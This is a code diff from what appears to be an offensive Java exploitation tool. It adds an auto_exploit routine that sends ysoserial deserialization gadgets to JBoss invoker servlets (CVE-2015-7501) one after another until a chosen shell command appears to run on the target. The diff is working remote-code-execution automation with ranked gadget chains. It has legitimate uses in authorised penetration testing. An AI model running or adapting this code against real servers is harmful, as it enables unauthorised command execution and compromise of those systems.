@@ -30,6 +30,30 @@ from typing import Any
 
 _HTTP_TIMEOUT = 8.0
 
+# Preferred gadget probe order — most commonly deployed libraries first.
+_PROBE_PRIORITY: tuple[str, ...] = (
+    "CommonsCollections6",
+    "CommonsCollections5",
+    "CommonsCollections7",
+    "CommonsCollections1",
+    "CommonsCollections2",
+    "CommonsCollections3",
+    "CommonsCollections4",
+    "CommonsBeanutils1",
+    "Spring1",
+    "Spring2",
+    "Groovy1",
+    "ROME",
+    "BeanShell1",
+    "Clojure",
+    "Jython1",
+    "MozillaRhino1",
+    "MozillaRhino2",
+)
+
+# These gadgets don't run OS commands — skip them in auto mode.
+_NON_EXEC_GADGETS: frozenset[str] = frozenset({"URLDNS", "JRMPClient"})
+
 # Default invoker paths to try (in priority order)
 _DEFAULT_PATHS = [
     "/invoker/JMXInvokerServlet",    # CVE-2015-7501
@@ -48,6 +72,7 @@ class InvokerExploitResult:
     endpoint: str = ""
     response_text: str | None = None
     error: str | None = None
+    gadget_used: str | None = None   # set by auto_exploit()
 
     def to_dict(self) -> dict[str, Any]:
         return {
@@ -57,6 +82,7 @@ class InvokerExploitResult:
             "endpoint": self.endpoint,
             "response_text": self.response_text,
             "error": self.error,
+            "gadget_used": self.gadget_used,
         }
 
 
@@ -195,6 +221,59 @@ class HttpInvoker:
             result.error = str(exc)
 
         return result
+
+    def auto_exploit(
+        self,
+        host: str,
+        port: int,
+        command: str,
+        path: str | None = None,
+        jar_path: str | None = None,
+    ) -> tuple[str | None, InvokerExploitResult]:
+        """Try gadgets in priority order and stop on first likely_success.
+
+        Parameters
+        ----------
+        host, port:
+            Target JBoss instance.
+        command:
+            Shell command to execute on the target.
+        path:
+            Invoker path to target (auto-detected if ``None``).
+        jar_path:
+            Path to ysoserial JAR (uses YSOSERIAL_PATH env var if ``None``).
+
+        Returns
+        -------
+        tuple[str | None, InvokerExploitResult]
+            ``(gadget_used, result)`` — ``gadget_used`` is ``None`` if no
+            gadget succeeded.
+        """
+        from javapwner.core.payload import YsoserialWrapper
+        wrapper = YsoserialWrapper(jar_path=jar_path)
+        try:
+            available = set(wrapper.list_gadgets())
+        except Exception:  # noqa: BLE001
+            empty = InvokerExploitResult(error="ysoserial unavailable")
+            return None, empty
+
+        to_try: list[str] = [
+            g for g in _PROBE_PRIORITY if g in available and g not in _NON_EXEC_GADGETS
+        ]
+        to_try += sorted(available - set(to_try) - _NON_EXEC_GADGETS)
+
+        for gadget in to_try:
+            try:
+                payload = wrapper.generate(gadget, command)
+            except Exception:  # noqa: BLE001
+                continue
+            result = self.exploit(host, port, payload, path=path)
+            if result.likely_success:
+                result.gadget_used = gadget
+                return gadget, result
+
+        last = InvokerExploitResult(error="No gadget produced a likely_success response")
+        return None, last
 
     def spray(
         self,
